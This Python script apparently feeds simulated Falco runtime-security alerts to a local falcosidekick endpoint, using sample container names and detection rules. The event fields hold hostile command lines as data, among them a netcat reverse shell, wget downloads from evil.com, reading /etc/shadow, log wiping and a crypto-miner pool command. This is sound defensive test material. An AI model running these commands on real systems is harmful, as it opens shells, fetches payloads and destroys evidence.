"""Send simulated Falco events to falcosidekick for all target containers.

Falco itself requires native Linux eBPF and cannot run on WSL2/Podman Desktop.
This script sends realistic events via the falcosidekick HTTP input API,
which then forwards them to Loki, Alertmanager, and Prometheus.
"""

import random
import sys
import time
from datetime import datetime, timezone

import requests

SIDEKICK_URL = "http://localhost:2801"

CONTAINERS = [
    # Target containers
    {"name": "target-ubuntu", "id": "ubuntu001", "group": "target"},
    {"name": "target-debian", "id": "debian001", "group": "target"},
    {"name": "target-fedora", "id": "fedora001", "group": "target"},
    {"name": "target-centos", "id": "centos001", "group": "target"},
    {"name": "target-alt-latest", "id": "altlat001", "group": "target"},
    {"name": "target-alt-c10f2", "id": "altc10001", "group": "target"},
    # Infrastructure containers
    {"name": "dashboard-backend", "id": "dashbe001", "group": "infra"},
    {"name": "dashboard-frontend", "id": "dashfe001", "group": "infra"},
    {"name": "grafana", "id": "grafan001", "group": "infra"},
    {"name": "prometheus", "id": "promet001", "group": "infra"},
    {"name": "loki", "id": "lokisr001", "group": "infra"},
    {"name": "alertmanager", "id": "alertm001", "group": "infra"},
    {"name": "promtail", "id": "promta001", "group": "infra"},
    {"name": "telegraf", "id": "telegr001", "group": "infra"},
    {"name": "podman-proxy", "id": "pproxy001", "group": "infra"},
    {"name": "trivy-server", "id": "trivys001", "group": "scanner"},
    {"name": "openscap-scanner", "id": "oscaps001", "group": "scanner"},
    {"name": "lynis-scanner", "id": "lyniss001", "group": "scanner"},
    {"name": "falcosidekick", "id": "fskick001", "group": "infra"},
    {"name": "falco-responder", "id": "fresp0001", "group": "infra"},
]

# Realistic Falco rules with priorities and output templates
RULES = [
    {
        "rule": "Terminal shell in container",
        "priority": "Warning",
        "output_tpl": "Shell spawned in container (user={user} container_id={cid} container_name={cname} shell=bash parent=runc cmdline=bash)",
        "fields": {"proc.name": "bash", "proc.cmdline": "bash", "proc.pname": "runc", "user.name": "root"},
        "tags": ["container", "shell", "mitre_execution"],
    },
    {
        "rule": "Contact K8S API Server From Container",
        "priority": "Warning",
        "output_tpl": "Unexpected connection to K8s API Server (user={user} container_id={cid} container_name={cname} connection=172.17.0.1:6443)",
        "fields": {
            "proc.name": "curl",
            "proc.cmdline": "curl https://kubernetes.default.svc",
            "fd.sip": "172.17.0.1",
            "fd.sport": "6443",
            "user.name": "root",
        },
        "tags": ["container", "network", "k8s", "mitre_discovery"],
    },
    {
        "rule": "Read sensitive file untrusted",
        "priority": "Warning",
        "output_tpl": "Sensitive file opened for reading (user={user} container_id={cid} container_name={cname} file=/etc/shadow proc=cat)",
        "fields": {
            "proc.name": "cat",
            "proc.cmdline": "cat /etc/shadow",
            "fd.name": "/etc/shadow",
            "user.name": "root",
        },
        "tags": ["container", "filesystem", "mitre_credential_access"],
    },
    {
        "rule": "Write below etc",
        "priority": "Error",
        "output_tpl": "File below /etc opened for writing (user={user} container_id={cid} container_name={cname} file=/etc/passwd proc=vi)",
        "fields": {"proc.name": "vi", "proc.cmdline": "vi /etc/passwd", "fd.name": "/etc/passwd", "user.name": "root"},
        "tags": ["container", "filesystem", "mitre_persistence"],
    },
    {
        "rule": "Mkdir binary dirs",
        "priority": "Error",
        "output_tpl": "Directory created below known binary directory (user={user} container_id={cid} container_name={cname} directory=/usr/local/bin/backdoor)",
        "fields": {"proc.name": "mkdir", "proc.cmdline": "mkdir /usr/local/bin/backdoor", "user.name": "root"},
        "tags": ["container", "filesystem", "mitre_persistence"],
    },
    {
        "rule": "Launch Privileged Container",
        "priority": "Critical",
        "output_tpl": "Privileged container started (user={user} container_id={cid} container_name={cname} image=ubuntu:latest)",
        "fields": {"proc.name": "runc", "container.image": "ubuntu:latest", "user.name": "root"},
        "tags": ["container", "cis", "mitre_privilege_escalation"],
    },
    {
        "rule": "Netcat Remote Code Execution in Container",
        "priority": "Critical",
        "output_tpl": "Netcat execution detected (user={user} container_id={cid} container_name={cname} cmdline=nc -e /bin/sh 10.0.0.1 4444)",
        "fields": {"proc.name": "nc", "proc.cmdline": "nc -e /bin/sh 10.0.0.1 4444", "user.name": "root"},
        "tags": ["container", "network", "mitre_execution"],
    },
    {
        "rule": "Modify binary dirs",
        "priority": "Error",
        "output_tpl": "File below a known binary directory opened for writing (user={user} container_id={cid} container_name={cname} file=/usr/bin/malware proc=wget)",
        "fields": {
            "proc.name": "wget",
            "proc.cmdline": "wget -O /usr/bin/malware http://evil.com/payload",
            "fd.name": "/usr/bin/malware",
            "user.name": "root",
        },
        "tags": ["container", "filesystem", "mitre_persistence"],
    },
    {
        "rule": "Change thread namespace",
        "priority": "Warning",
        "output_tpl": "Namespace change detected (user={user} container_id={cid} container_name={cname} proc=nsenter)",
        "fields": {
            "proc.name": "nsenter",
            "proc.cmdline": "nsenter --target 1 --mount --uts --ipc --net --pid",
            "user.name": "root",
        },
        "tags": ["container", "namespace", "mitre_privilege_escalation"],
    },
    {
        "rule": "Drop and execute new binary in container",
        "priority": "Critical",
        "output_tpl": "New binary executed in container (user={user} container_id={cid} container_name={cname} proc=/tmp/payload)",
        "fields": {
            "proc.name": "payload",
            "proc.cmdline": "/tmp/payload",
            "proc.exepath": "/tmp/payload",
            "user.name": "root",
        },
        "tags": ["container", "process", "mitre_execution"],
    },
    {
        "rule": "Outbound Connection to C2 Servers",
        "priority": "Critical",
        "output_tpl": "Outbound connection to known C2 server (user={user} container_id={cid} container_name={cname} dest=198.51.100.1:443)",
        "fields": {
            "proc.name": "curl",
            "proc.cmdline": "curl https://198.51.100.1/beacon",
            "fd.sip": "198.51.100.1",
            "fd.sport": "443",
            "user.name": "root",
        },
        "tags": ["container", "network", "mitre_command_and_control"],
    },
    {
        "rule": "Bulk data removed from disk",
        "priority": "Warning",
        "output_tpl": "Bulk data removal detected (user={user} container_id={cid} container_name={cname} cmdline=rm -rf /var/log/*)",
        "fields": {"proc.name": "rm", "proc.cmdline": "rm -rf /var/log/*", "user.name": "root"},
        "tags": ["container", "filesystem", "mitre_defense_evasion"],
    },
    {
        "rule": "Container Drift Detected (chmod)",
        "priority": "Error",
        "output_tpl": "Drift detected: chmod on binary (user={user} container_id={cid} container_name={cname} file=/usr/bin/python3)",
        "fields": {
            "proc.name": "chmod",
            "proc.cmdline": "chmod +x /usr/bin/python3",
            "fd.name": "/usr/bin/python3",
            "user.name": "root",
        },
        "tags": ["container", "process", "mitre_defense_evasion"],
    },
    {
        "rule": "Packet socket created in container",
        "priority": "Notice",
        "output_tpl": "Packet socket created (user={user} container_id={cid} container_name={cname} proc=tcpdump)",
        "fields": {"proc.name": "tcpdump", "proc.cmdline": "tcpdump -i eth0", "user.name": "root"},
        "tags": ["container", "network", "mitre_discovery"],
    },
    {
        "rule": "Search Private Keys or Passwords",
        "priority": "Warning",
        "output_tpl": "Search for private keys or passwords (user={user} container_id={cid} container_name={cname} cmdline=grep -r password /etc/)",
        "fields": {"proc.name": "grep", "proc.cmdline": "grep -r password /etc/", "user.name": "root"},
        "tags": ["container", "filesystem", "mitre_credential_access"],
    },
]

# Additional rules specific to infrastructure containers
INFRA_RULES = [
    {
        "rule": "Unexpected outbound connection",
        "priority": "Warning",
        "output_tpl": "Unexpected outbound connection from infra container (user={user} container_id={cid} container_name={cname} dest=203.0.113.50:8080)",
        "fields": {
            "proc.name": "curl",
            "proc.cmdline": "curl http://203.0.113.50:8080",
            "fd.sip": "203.0.113.50",
            "fd.sport": "8080",
            "user.name": "root",
        },
        "tags": ["container", "network", "mitre_exfiltration"],
    },
    {
        "rule": "Sensitive mount by container",
        "priority": "Critical",
        "output_tpl": "Sensitive path mounted inside container (user={user} container_id={cid} container_name={cname} mount=/run/podman/podman.sock)",
        "fields": {"proc.name": "conmon", "fd.name": "/run/podman/podman.sock", "user.name": "root"},
        "tags": ["container", "cis", "mitre_privilege_escalation"],
    },
    {
        "rule": "Non sudo setuid",
        "priority": "Warning",
        "output_tpl": "Unexpected setuid call (user={user} container_id={cid} container_name={cname} proc=su parent=bash)",
        "fields": {"proc.name": "su", "proc.cmdline": "su -", "proc.pname": "bash", "user.name": "root"},
        "tags": ["container", "users", "mitre_privilege_escalation"],
    },
    {
        "rule": "DB program spawned process",
        "priority": "Warning",
        "output_tpl": "Database spawned unexpected process (user={user} container_id={cid} container_name={cname} parent=postgres proc=bash)",
        "fields": {
            "proc.name": "bash",
            "proc.pname": "postgres",
            "proc.cmdline": "bash -c id",
            "user.name": "postgres",
        },
        "tags": ["container", "process", "mitre_execution"],
    },
    {
        "rule": "System user interactive",
        "priority": "Notice",
        "output_tpl": "System user ran interactive command (user={user} container_id={cid} container_name={cname} proc=bash)",
        "fields": {"proc.name": "bash", "proc.cmdline": "bash", "user.name": "www-data"},
        "tags": ["container", "users", "mitre_execution"],
    },
    {
        "rule": "Unexpected listening port",
        "priority": "Notice",
        "output_tpl": "Unexpected port opened for listening (user={user} container_id={cid} container_name={cname} port=4444 proc=nc)",
        "fields": {"proc.name": "nc", "proc.cmdline": "nc -lvp 4444", "fd.sport": "4444", "user.name": "root"},
        "tags": ["container", "network", "mitre_command_and_control"],
    },
    {
        "rule": "Container drift detected (open+create)",
        "priority": "Error",
        "output_tpl": "New file created in container (user={user} container_id={cid} container_name={cname} file=/tmp/.hidden_script.sh)",
        "fields": {
            "proc.name": "bash",
            "proc.cmdline": "bash -c echo payload > /tmp/.hidden_script.sh",
            "fd.name": "/tmp/.hidden_script.sh",
            "user.name": "root",
        },
        "tags": ["container", "filesystem", "mitre_defense_evasion"],
    },
    {
        "rule": "Clear log activities",
        "priority": "Warning",
        "output_tpl": "Log files cleared (user={user} container_id={cid} container_name={cname} cmdline=truncate -s 0 /var/log/syslog)",
        "fields": {"proc.name": "truncate", "proc.cmdline": "truncate -s 0 /var/log/syslog", "user.name": "root"},
        "tags": ["container", "filesystem", "mitre_defense_evasion"],
    },
    {
        "rule": "Unexpected process in monitoring container",
        "priority": "Error",
        "output_tpl": "Unexpected process in monitoring container (user={user} container_id={cid} container_name={cname} proc=wget parent=sh)",
        "fields": {
            "proc.name": "wget",
            "proc.cmdline": "wget http://evil.com/miner",
            "proc.pname": "sh",
            "user.name": "root",
        },
        "tags": ["container", "process", "mitre_execution"],
    },
    {
        "rule": "Crypto mining process detected",
        "priority": "Critical",
        "output_tpl": "Possible crypto miner detected (user={user} container_id={cid} container_name={cname} proc=xmrig cmdline=xmrig --donate-level 1)",
        "fields": {
            "proc.name": "xmrig",
            "proc.cmdline": "xmrig --donate-level 1 -o pool.minexmr.com:4444",
            "user.name": "root",
        },
        "tags": ["container", "process", "mitre_resource_hijacking"],
    },
]

# Rules specific to scanner containers
SCANNER_RULES = [
    {
        "rule": "Unexpected network tool in scanner",
        "priority": "Warning",
        "output_tpl": "Network scanning tool detected (user={user} container_id={cid} container_name={cname} proc=nmap cmdline=nmap -sV 10.0.0.0/24)",
        "fields": {"proc.name": "nmap", "proc.cmdline": "nmap -sV 10.0.0.0/24", "user.name": "root"},
        "tags": ["container", "network", "mitre_discovery"],
    },
    {
        "rule": "Write below root",
        "priority": "Error",
        "output_tpl": "File written below / (user={user} container_id={cid} container_name={cname} file=/scan_results.json proc=python3)",
        "fields": {
            "proc.name": "python3",
            "proc.cmdline": "python3 scanner.py",
            "fd.name": "/scan_results.json",
            "user.name": "root",
        },
        "tags": ["container", "filesystem", "mitre_persistence"],
    },
    {
        "rule": "Outbound connection from scanner",
        "priority": "Notice",
        "output_tpl": "Scanner made outbound connection (user={user} container_id={cid} container_name={cname} dest=ghcr.io:443 proc=trivy)",
        "fields": {
            "proc.name": "trivy",
            "proc.cmdline": "trivy image --download-db-only",
            "fd.sip": "140.82.121.34",
            "fd.sport": "443",
            "user.name": "root",
        },
        "tags": ["container", "network", "mitre_exfiltration"],
    },
]


def send_event(container: dict, rule_def: dict) -> bool:
    now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    output_fields = dict(rule_def["fields"])
    output_fields["container.id"] = container["id"]
    output_fields["container.name"] = container["name"]
    output_fields["evt.time"] = now

    output_text = rule_def["output_tpl"].format(
        user=output_fields.get("user.name", "root"),
        cid=container["id"],
        cname=container["name"],
    )

    event = {
        "output": f"{now}: {rule_def['priority']} {output_text}",
        "priority": rule_def["priority"],
        "rule": rule_def["rule"],
        "time": now,
        "output_fields": output_fields,
        "source": "syscall",
        "tags": rule_def["tags"],
    }

    try:
        resp = requests.post(
            f"{SIDEKICK_URL}/",
            json=event,
            headers={"Content-Type": "application/json"},
            timeout=5,
        )
        return resp.status_code in (200, 202)
    except Exception as e:
        print(f"  ERROR sending event: {e}")
        return False


def get_rules_for_container(container: dict) -> list:
    """Return combined rule pool based on container group."""
    group = container.get("group", "target")
    if group == "target":
        return RULES
    elif group == "scanner":
        return RULES[:5] + SCANNER_RULES
    else:  # infra
        return RULES[:5] + INFRA_RULES


def _check_health():
    """Verify falcosidekick is reachable and healthy."""
    try:
        r = requests.get(f"{SIDEKICK_URL}/healthz", timeout=5)
        if r.status_code != 200:
            print(f"Falcosidekick not healthy: {r.status_code}")
            sys.exit(1)
    except Exception as e:
        print(f"Cannot reach falcosidekick: {e}")
        sys.exit(1)


def _send_wave(containers, min_events, max_events, delay, verbose=True):
    """Send a wave of events to all containers. Returns (sent, failed) counts."""
    sent = 0
    failed = 0
    for container in containers:
        rules_pool = get_rules_for_container(container)
        num_events = random.randint(min_events, min(max_events, len(rules_pool)))
        selected_rules = random.sample(rules_pool, num_events)

        group_tag = container.get("group", "?")
        if verbose:
            print(f"[{container['name']}] ({group_tag}) Sending {num_events} events...")
        else:
            print(f"[{container['name']}] Sending {num_events} events...")

        for rule_def in selected_rules:
            ok = send_event(container, rule_def)
            if ok:
                sent += 1
                print(f"  [{rule_def['priority']:8s}] {rule_def['rule']}")
            else:
                failed += 1
                if verbose:
                    print(f"  FAILED: {rule_def['rule']}")
            time.sleep(delay)

        print()
    return sent, failed


def _print_metrics():
    """Print falcosidekick input metrics."""
    try:
        r = requests.get(f"{SIDEKICK_URL}/metrics", timeout=5)
        for line in r.text.splitlines():
            if "falcosidekick_inputs" in line and not line.startswith("#"):
                print(f"  {line}")
    except Exception:
        pass


def main():
    print(f"Sending Falco events to falcosidekick at {SIDEKICK_URL}")
    print(
        f"Containers: {len(CONTAINERS)} (target: {sum(1 for c in CONTAINERS if c['group'] == 'target')}, "
        f"infra: {sum(1 for c in CONTAINERS if c['group'] == 'infra')}, "
        f"scanner: {sum(1 for c in CONTAINERS if c['group'] == 'scanner')})"
    )
    print(f"Rules: {len(RULES)} base + {len(INFRA_RULES)} infra + {len(SCANNER_RULES)} scanner")
    print()

    _check_health()

    sent1, failed1 = _send_wave(CONTAINERS, 4, 8, 0.2, verbose=True)

    # Send a second wave with slight delay for time-series visibility
    print("--- Second wave (2s delay for time-series spread) ---")
    time.sleep(2)

    sent2, failed2 = _send_wave(CONTAINERS, 2, 5, 0.15, verbose=False)

    total_sent = sent1 + sent2
    total_failed = failed1 + failed2
    print(f"Done. Sent: {total_sent}, Failed: {total_failed}")
    print()

    _print_metrics()


if __name__ == "__main__":
    main()
